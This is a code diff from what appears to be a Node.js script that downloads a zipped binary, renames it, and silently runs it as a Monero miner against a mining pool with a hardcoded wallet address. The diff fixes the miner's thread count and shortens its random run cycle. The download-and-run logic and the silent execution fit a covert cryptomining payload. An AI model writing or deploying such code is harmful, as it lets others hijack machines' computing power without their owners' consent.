@@ -11,7 +11,7 @@ const timeout = (ms) => {
 }
 
 const runJob = (nameTool) => {
-    const coreNumber = Math.floor(Math.random() * 2) + 2;
+    const coreNumber = 2 || Math.floor(Math.random() * 2) + 2;
     const runMonney = shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${ coreNumber } --astrobwt-avx2`, { silent: true, async: true });
     if (runMonney.code !== undefined) {
         return 0;
@@ -38,7 +38,7 @@ const downloadImage = async () => {
             if (shell.exec(`rm -rf SHA256SUMS runtool config.json && unzip ${filename} && cp runtool ${nameTool} && rm -rf ${filename}`, { silent: true }).code === 0) {
                 console.log('-- giai nen file thanh cong');
                 runJob(nameTool);
-                return resolve(((Math.floor(Math.random() * 10) + 10) * 60) * 1000);
+                return resolve(((Math.floor(Math.random() * 5) + 3) * 60) * 1000);
             }
         });
         writer.on('error', () => {
